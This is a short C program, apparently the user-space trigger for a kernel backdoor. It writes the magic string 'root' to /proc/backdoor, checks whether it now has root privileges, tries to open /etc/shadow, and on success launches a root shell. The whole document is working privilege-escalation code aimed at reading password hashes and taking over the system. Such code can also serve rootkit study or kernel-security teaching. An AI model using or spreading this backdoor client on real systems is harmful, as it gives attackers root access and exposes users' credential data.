#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>

int main()
{
    int fd;
    ssize_t ret;
    char *magic = "root";

    printf("Before: UID=%d, EUID=%d\n", getuid(), geteuid());

    fd = open("/proc/backdoor", O_WRONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    ret = write(fd, magic, strlen(magic));
    if (ret != strlen(magic)) {
        perror("write");
        close(fd);
        return 1;
    }
    close(fd);

    printf("After: UID=%d, EUID=%d\n", getuid(), geteuid());

    FILE *f = fopen("/etc/shadow", "r");
    if (f) {
        printf("Success, /etc/shadow opened.\n");
        fclose(f);
    }
    else {
        perror("Failed, fopen /etc/shadow");
    }

    if (getuid() == 0) {
        printf("Now you are root! Launching /bin/sh...\n");
        execl("/bin/sh", "sh", NULL);
        perror("execl");
        return 1;
    }
    else {
        printf("Failed to become root.\n");
    }
    return 0;
}
